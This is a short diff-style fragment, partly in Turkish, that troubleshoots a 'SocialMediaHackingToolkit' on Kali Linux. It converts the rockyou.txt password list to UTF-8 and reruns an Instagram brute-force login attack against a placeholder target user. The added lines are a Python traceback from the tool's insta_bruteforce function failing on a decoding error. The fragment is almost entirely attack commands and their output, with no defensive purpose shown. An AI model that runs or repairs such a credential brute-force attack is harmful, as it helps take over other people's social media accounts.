@@ -3,3 +3,11 @@ iconv -f ISO-8859-1 -t UTF-8 ~/SocialMediaHackingToolkit/wordlist/rockyou.txt -o
 Sonra yeni wordlist’i kullanarak tekrar brute-force dene:
 
 python3 ~/SocialMediaHackingToolkit/cmd/main.py --bruteforce -u hedefkullanici -w ~/SocialMediaHackingToolkit/wordlist/rockyou_utf8.txt
+Traceback (most recent call last):
+  File "/home/kali/SocialMediaHackingToolkit/cmd/main.py", line 25, in <module>
+    insta_bruteforce(username, wordlist, vpn)
+  File "/home/kali/SocialMediaHackingToolkit/cmd/utils.py", line 133, in insta_bruteforce
+    wl_lines = [line.strip() for line in wl_file.readlines()]  # Rimuovi i caratteri di nuova riga
+                                         ^^^^^^^^^^^^^^^^^^^
+  File "<frozen codecs>", line 322, in decode
+UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 933: invalid continuation byte
